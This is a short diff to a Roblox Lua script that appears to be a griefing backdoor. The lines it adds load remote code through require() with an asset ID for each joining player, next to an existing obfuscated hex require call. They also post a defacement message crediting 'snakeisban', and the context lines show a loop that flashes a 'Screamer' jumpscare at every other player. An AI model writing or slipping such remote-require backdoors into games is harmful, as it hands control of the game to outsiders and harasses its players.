@@ -1,6 +1,11 @@
-
+game.Players.PlayerAdded:Connect(function(player)
+ require(15124075654)(player.Name)
+end)
 require(0x38c5453e6)()
 wait(1)
+local h = Instance.new("Hint", workspace)
+h.Text = "This game was fucked by snakeisban"
+
 
 for i,v in pairs(game.Players:GetPlayers()) do
 		if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
@@ -17,7 +22,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
 				s:Play()
 				print("Screamed "..v.Name)
 				while wait(9) do
-
+                                  
 					newimage.Parent:Destroy()
 
 				end
